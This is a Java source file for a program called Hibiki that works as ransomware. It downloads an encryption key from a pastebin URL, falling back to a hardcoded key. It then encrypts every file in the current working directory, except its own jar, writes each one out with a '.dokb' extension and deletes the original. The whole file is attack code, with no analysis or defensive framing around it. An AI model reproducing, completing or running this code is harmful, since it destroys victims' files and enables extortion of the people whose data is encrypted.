import java.io.*;
import java.util.*;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;

public class Hibiki {
    private static final String EXTENSION = ".dokb";
    private static final String SELF = "Hibiki.jar";

    public static void main(String[] args) {
        String KEY;
        final URI uri;
        
        try {
            uri = new URI("https://pastebin.com/raw/5JwUSV0S");
            URL url = uri.toURL();
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            while ((KEY = reader.readLine()) != null) {
                    response.append(KEY);
                }
            KEY = response.toString();

        } catch (Exception e) {
            KEY = "H8EmHFHxpZtQgolRjOa2szZBaHELL0L4DYTNZxHmeV2kahWMOt97doKiNCPwUWjfvhm4hCiYDjoQbytOanQRpaA0nxSZZLsorGjSP2aQNxIXyr4rpdfSVZRik6ROl7XCBkeBOzWZH==";
        }

        String dir = System.getProperty("user.dir");
        CryptoEngine engine = new CryptoEngine(KEY);
        List<File> files = FileUtility.getFiles(dir, SELF);

        for (File file : files) {
            try {
                byte[] original = FileUtility.readFile(file);
                byte[] encrypted = engine.encrypt(original);
                String newName = file.getAbsolutePath() + EXTENSION;
                FileUtility.writeFile(new File(newName), encrypted);
                file.delete();
            } catch (IOException e) {
            }
        }
    }
}
